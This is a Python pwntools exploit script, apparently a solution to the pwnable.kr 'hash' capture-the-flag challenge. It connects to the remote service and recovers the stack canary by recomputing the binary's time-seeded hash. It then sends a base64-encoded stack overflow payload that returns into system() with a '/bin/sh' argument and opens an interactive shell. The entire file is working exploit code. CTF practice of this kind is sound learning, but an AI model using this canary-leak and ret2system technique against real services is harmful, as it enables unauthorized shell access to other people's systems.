import math
from pwn import *
import subprocess
from pathlib import Path
from encodings.base64_codec import base64_encode
from datetime import datetime, timedelta, timezone


BASE_PATH = Path(__file__).parent
CALCULATE_HASH_BINARY = Path(BASE_PATH, Path('calculate_hash', 'calculate_hash'))
EXPLOITABLE_BINARY = Path(BASE_PATH, Path('hash'))

# Depends on the remote time, in pwnable.kr the time is UTC-5 
# (Discovered it by running "date" command by one of the previous challenges)
REMOTE_UTC_DIFFERENCE = -5

# /bin/sh converted to bytes, with little endian
SHELL_COMMAND_LITTLE_ENDIAN = b'\x2f\x62\x69\x6e\x2f\x73\x68\x00'   

EBP_ADDRESS = 0xffffd168
BUFFER_SIZE = 0x200
SHELL_COMMAND_ADDRESS = 0xffffd754

SYSTEM_CALL_ADDRESS = 0x8049187

def calculate_hash() -> int:
    """
    Calculates a custom hash (exactly like the binary does) without the canary.
    """
    time = math.floor(datetime.now().timestamp())
    popen = subprocess.Popen([CALCULATE_HASH_BINARY, str(time)], stdout=subprocess.PIPE)
    result, _ = popen.communicate()

    return int(result.decode())

def calculate_canary(original_hash: int) -> int:
    return (original_hash - calculate_hash()) & 0xFFFFFFFF

def main() -> None:
    # Get the original hash
    connection = remote('pwnable.kr', 9002)
    # connection = process(str(EXPLOITABLE_BINARY))
    
    print(connection.readuntil(':'))
    original_hash = int(connection.read().decode().strip())

    # Calculate the canary value
    canary = calculate_canary(original_hash)

    # Response to the captcha
    connection.sendline(str(original_hash).encode())

    # Craft the payload and send it
    payload = b'A' * BUFFER_SIZE + p32(canary) + 12 * b'A' + p32(SYSTEM_CALL_ADDRESS) + p32(SHELL_COMMAND_ADDRESS) + SHELL_COMMAND_LITTLE_ENDIAN
    payload = base64_encode(payload)[0].decode().replace('\n', '')
    connection.sendline(payload)

    # Make interactive to get the gained shell :)
    connection.interactive()


if __name__ == '__main__':
    main()
